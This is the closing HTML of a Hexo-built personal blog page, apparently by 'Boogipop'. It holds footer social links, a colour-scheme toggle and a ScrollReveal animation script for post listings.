                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>